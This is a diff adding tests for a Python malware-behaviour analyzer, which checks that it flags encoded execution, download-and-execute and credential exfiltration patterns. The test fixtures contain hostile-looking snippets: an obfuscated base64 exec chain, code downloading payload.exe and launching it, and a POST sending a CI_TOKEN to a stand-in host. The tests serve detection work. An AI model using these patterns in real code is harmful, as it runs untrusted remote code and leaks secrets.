@@ -278,3 +278,60 @@ if __name__ == "__main__":
     result = PythonExtractor().analyze_source(source, "transformer.py")
 
     assert result.effect_summary.primary_purpose != "local-code-transformer"
+
+
+def test_literal_dunder_import_chain_recovers_nested_capabilities():
+    source = (
+        "__import__('builtins').exec("
+        "__import__('builtins').compile("
+        "__import__('base64').b64decode('YQ=='), '<x>', 'exec'))\n"
+    )
+    result = PythonExtractor().analyze_source(source, "encoded.py")
+    operations = [event.op for event in result.events]
+    assert "DECODE" in operations
+    assert "CODE_COMPILE" in operations
+    assert "DYNAMIC_EXEC" in operations
+    path = next(p for p in result.behavior_paths if p.motif == "encoded_execution")
+    assert path.evidence_kind == "dataflow"
+    assert path.confidence == "high"
+
+
+def test_legacy_urlopen_staged_file_and_startfile_form_download_execute():
+    source = r"""
+import os
+import urllib
+
+def init():
+    remote = urllib.urlopen('https://example.invalid/payload.exe')
+    payload = remote.read()
+    output = open('download.exe', 'w')
+    output.write(payload)
+    os.startfile(os.getcwd() + '\\download.exe')
+"""
+    result = PythonExtractor().analyze_source(source, "legacy.py")
+    operations = [event.op for event in result.events]
+    assert "NETWORK_RECEIVE" in operations
+    assert "PROCESS_EXEC" in operations
+    path = next(p for p in result.behavior_paths if p.motif == "download_execute")
+    assert path.evidence_kind == "dataflow"
+
+
+def test_dotted_dunder_import_is_not_assumed_to_return_full_module():
+    source = "__import__('urllib.request').urlopen('https://example.invalid')\n"
+    result = PythonExtractor().analyze_source(source, "dynamic.py")
+    assert "NETWORK_RECEIVE" not in [event.op for event in result.events]
+
+
+def test_generic_environment_value_is_not_labeled_as_credential_exfiltration():
+    sensitive = PythonExtractor().analyze_source(
+        "import os, requests\nrequests.post('https://x.invalid', data=os.getenv('CI_TOKEN'))\n"
+    )
+    generic = PythonExtractor().analyze_source(
+        "import os, requests\nrequests.post('https://x.invalid', data=os.getenv('API_URL'))\n"
+    )
+    assert any(
+        path.motif == "credential_or_file_exfil" for path in sensitive.behavior_paths
+    )
+    assert not any(
+        path.motif == "credential_or_file_exfil" for path in generic.behavior_paths
+    )
